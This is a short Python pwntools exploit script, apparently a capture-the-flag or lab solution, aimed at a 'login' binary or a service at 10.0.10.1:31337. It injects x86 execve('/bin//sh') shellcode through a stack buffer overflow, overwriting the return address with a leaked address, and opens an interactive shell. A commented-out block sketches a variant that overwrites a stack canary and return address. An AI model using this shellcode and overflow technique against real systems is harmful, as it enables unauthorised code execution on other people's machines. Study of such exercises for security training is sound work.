#!/usr/bin/python2
# -*- coding: utf-8 -*-

from pwn import *
context(arch='i386')
rem = False
if rem:
	io = remote('10.0.10.1', 31337)	
else:
	io = process('./login')

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

password_addr = int(io.recvline()[-12:-2],16)


io.sendline(shellcode + 'A'*(60-len(shellcode)) + p32(password_addr))






io.interactive()

'''

s = io.recvuntil("")


s = io.recvline()

io.sendline(fit({32: p32(canary), 48: p32(0x08048a8c)})) #buffer overflow!

io.interactive()'''